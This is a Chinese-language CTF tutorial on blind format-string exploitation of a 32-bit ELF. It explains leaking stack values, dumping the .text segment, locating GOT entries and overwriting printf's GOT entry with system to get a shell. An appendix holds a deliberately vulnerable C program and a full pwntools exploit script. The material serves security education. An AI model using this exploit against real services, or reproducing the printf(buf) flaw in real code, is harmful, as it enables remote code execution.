
# 【CTF攻略】格式化字符串blind pwn详细教程


                                阅读量   
                                **311922**
                            
                        |
                        
                                                                                                                                    ![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](./img/85731/t011d4404b7053c078e.jpg)](./img/85731/t011d4404b7053c078e.jpg)<br>**

作者：[4SUN4_C8](http://bobao.360.cn/member/contribute?uid=2846431172)

预估稿费：400RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**<br>**

**前言**

CTF中最近几年出现了一种比较新类型的题目，blind pwn，这种pwn不给你提供二进制程序，只是提供一个ip和port，其中有一种就是利用格式化字符串你漏洞的blind pwn，是通过格式化字符串漏洞的任意读和任意写功能通过使其泄露信息从而实现目的。在学习这种格式化字符串的blind pwn时，由于对格式化字符串漏洞不太熟悉，因此遇到了很多坑，所以打算写一个通俗易懂的教程，有做的麻烦之处请大佬们指出。

下面来介绍一种最基础的blind pwn，也就是格式化字符串的，程序是32位的elf，环境是ubuntu_1604_x64。

<br>

**基础知识**

格式化字符串的漏洞在网上有很多教程，在这里我简要提一点这个教程中用到的关键技术。

以下的N需要代换成10进制的整数，而且大小是有限制的。

%N$p：以16进制的格式输出位于printf第N个参数位置的值；

%N$s：以printf第N个参数位置的值为地址，输出这个地址指向的字符串的内容；

%N$n：以printf第N个参数位置的值为地址，将输出过的字符数量的值写入这个地址中，对于32位elf而言，%n是写入4个字节，%hn是写入2个字节，%hhn是写入一个字节；

%Nc：输出N个字符，这个可以配合%N$n使用，达到任意地址任意值写入的目的。

<br>

**题目示例**

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01efc194956700bf47.png)

泄露栈信息

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d8e8081206f40f80.png)

运行泄露脚本的程序输出：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01dbd5cd5e648391ed.png)

为了加深理解，我也放上了对程序使用gdb实际调试时的栈情景，breakpoint断在了main函数中call printf的指令上：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bc8573ab80bb3028.png)

两个信息相对照可以看到一些很有意思的东西，其中最有用的是注意到gdb的调试信息中的位于0236与0260的两个0x8048420(_start)，这个其实在每个elf加载时都是类似的，可以作为一个通过栈泄露的信息确定.text代码段基址的一个特征，因此，可以从泄露的输出信息中获取到这个.text的代码段基址。

dump .text段：

从泄露的栈信息中，我们还可以发现别的东西，比如说我们输入的字符串在栈中的偏移（调用printf时的栈），可以看到在偏移为24和28的地方其实是我们输入的字符串“%d$p.TMP”，因此我们可以确定这里的字符串的偏移为6（也就是%N$中N的值），每增加4个字节的字符串，N就加1（因为是32位的elf程序）：

这里提一下，32位的elf和64位的elf在确定偏移的N的时候还是有差别的，原因在于64位下的调用约定与32位下不同，对于printf，32位下默认全部参数通过栈来传递，而64位下参数首先通过RDI，RSI，RDX，RCX，R8，R9这6个寄存器传递，然后再通过栈传递，因此确定的时候需要稍微注意一下，如果一个参数在rsp的位置，那么N实际上是7而不是0（32位下是0）。

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e77ffc7df6fa3583.png)

有了偏移之后，可以使用“%N$s”来写leak函数了：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010e89a2d6bcfa0abf.png)

到了这一步，使用DynELF应该就可以做了，但是我在实际操作的过程中总是遇到或多或少的问题，导致DynELF并没有成功过……因此只能学习另外一种麻烦但是更基础的方法来做。

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015e20bc58baba2b6a.png)

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016528bf0cca53bcbf.png)

所以根据获取到的.text段的基址，可以把.text段dump下来，从而直接从二进制程序入手获得相关的信息，以下是进行dump的脚本。

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017b874d5e3184ff31.png)

在进行dump的过程中实际上是需要注意一些内容的，原因是%s进行输出时实际上是x00截断的，但是.text段中不可避免会出现x00，但是我们注意到还有一个特性，如果对一个x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为x00，所以可以设置为x00然后将地址加1进行dump。

Dump过程：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0158a86e8daa6416ea.png)

最后写到文件中，把这个文件用ida打开即可。

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012db81a5b56a60134.png)

可以看到，刚打开时是这个样子的：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0186067db37fcceeeb.png)

由于我们知道.text的段基址是0x08048420，因此对段基址rebase一下：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01757f4c38adcef1ef.png)

如果对_start函数有些了解的话，可以知道在这里红色的0x80483F0实际上是__libc_start_main，而0x804851B实际上就是main函数的地址。

到达main函数的地址，发现这个函数非常好看，那些标红的地址是因为我们没有dump这些地方的内存，但是其实是非常有用处的：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f6f10080cb367633.png)

F5一下，根据这个二进制的行为，可以很容易地推断出对应的函数在plt表中的地址：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012a3be395306c603b.png)

也就是：



```
read@plt:0x80483D0
printf@plt:0x80483E0
putchar@plt:0x8048400
```

我们结合源程序看一下这个地址中存储的内容：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a5b8f688d08c6804.png)

实际上就是跳转到got表中相应表项中的值，而且最关键的，我们可以通过这个地址中的内容获取到got表相应表项的地址。

对于read，那么FF 25 10 A0 04 08这条指令中跳转到的got表地址就是0x0804A010，也就是说read的got表项的地址就是0x0804A010。

有了got表的地址，对于没有开FULL RELRO的程序，我们就可以通过覆盖got表来劫持控制流了。

<br>

**覆盖got表获得shell**

对于上面的思路，覆盖got表并获取shell的流程是（以覆盖printf的got表为例）：

a)	确定printf的plt地址

b)	通过泄露plt表中的指令内容确定对应的got表地址

c)	通过泄露的got表地址泄露printf函数的地址

d)	通过泄露的printf的函数地址确定libc基址，从而获得system地址

e)	使用格式化字符串的任意写功能将printf的got表中的地址修改为system的地址

f)	send字符串“/bin/sh;”，那么在调用printf(“/bin/sh;”)的时候实际上调用的是system(“/bin/sh;”)，从而成功获取shell

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b9a11177f165436a.png)

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010ab0bca8b71c5235.png)

上面的代码就是步骤a-f的一个翻译，需要注意的是实际上不是一步完成的，应该是首先泄露printf的地址，然后通过这个地址使用libc-database进行查询，然后确定相关的差异值：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013b49476362ef6f44.png)

然后是对got表内容的修改：

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012771ca9c8b18c426.png)

这个payload的意思就是前32个字节是格式化字符串的内容。

由于system_addr与printf_addr实际上只有最高字节不同，所以只覆盖3个字节即可，这里用到的就是%hhn(写入一个字节)以及%hn（写入两个字节），所以我们对printf_got_plt_addr写入一个字节，对printf_got_plt_addr+1写入2个字节就可以完美修改printf的got表中的地址实际上是system的地址。

至于格式化字符串中的两个偏移分别为%14$与%15$，是因为32Bytes=4Bytes*8，而字符串在栈中的偏移开始为6，因此第一个地址printf_got_plt_addr的偏移实际上是6+8=14，而第二个地址printf_got_plt_addr+1的偏移是6+8+1=15。

<br>

**最终的执行结果**

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0141ea259ed6c6e718.png)

[![](./img/85731/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016c9e82bb65606f2c.png)

从而完美获得了shell。

<br>

**参考链接**

[http://bruce30262.logdown.com/posts/1255979-33c3-ctf-2016-espr](http://bruce30262.logdown.com/posts/1255979-33c3-ctf-2016-espr) 

<br>

**附录**

**blind_pwn_printf.c**



```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main()
{
setbuf(stdin, 0LL);
setbuf(stdout, 0LL);
setbuf(stderr, 0LL);
char buf[100];
while (1)
{
read(STDIN_FILENO, buf, 100);
printf(buf);
putchar('n');
}
return 0;
}
```

**blind_pwn.py**

```
from pwn import *
import time
import binascii
context.log_level = 'INFO'
exe = 'blind_pwn_printf'
r = process(exe)
# # dump stack
# for i in range(100):
# payload = '%%%d$p.TMP' % (i)
# r.sendline(payload)
# val = r.recvuntil('.TMP')
# print i*4, val.strip().ljust(10)
# r.recvrepeat(0.2)
def leak(addr):
    payload = "%8$s.TMP" + p32(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    resp = r.recvuntil(".TMP")
    ret = resp[:-4:]
    print "ret:", binascii.hexlify(ret), len(ret)
    remain = r.recvrepeat(0.2)
    return ret
# # failed try
# d = DynELF(leak, 0x8048420)
# # dynamic_ptr = d.dynamic
# system_addr = d.lookup('system', 'libc')
# printf_addr = d.lookup('printf', 'libc')
# # dump .text segmentation
# start_addr = 0x8048420
# # leak(start_addr)
# text_seg = ''
# try:
# while True:
# ret = leak(start_addr)
# text_seg += ret
# start_addr += len(ret)
# if len(ret) == 0:
# start_addr += 1
# text_seg += 'x00'
# except Exception as e:
# print e
# finally:
# print '[+]', len(text_seg)
# with open('dump_bin', 'wb') as fout:
# fout.write(text_seg)
log.success('leaking printf_plt_code')
printf_plt_addr = 0x80483E0
printf_plt_code = leak(printf_plt_addr)
printf_got_plt_addr = u32(printf_plt_code[2:6])
log.success('printf_got_plt_addr: %08x' % (printf_got_plt_addr))
log.success('leaking printf_addr')
printf_addr = u32(leak(printf_got_plt_addr)[:4])
log.success('printf_addr: %08x' % (printf_addr))
libc_addr = printf_addr - 0x00049670
system_addr = libc_addr + 0x0003ada0
log.success('system_addr: %08x' % (system_addr))
log.success('test write...')
byte1 = system_addr &amp; 0xff
byte2 = (system_addr &amp; 0xffff00) &gt;&gt; 8
payload = '%' + str(byte1) + 'c' + '%14$hhn'
payload += '%' + str(byte2 - byte1) + 'c' +'%15$hn'
payload = payload.ljust(32, 'A')
print payload
print len(payload)
payload += p32(printf_got_plt_addr) + p32(printf_got_plt_addr + 1)
r.sendline(payload)
r.interactive()
```
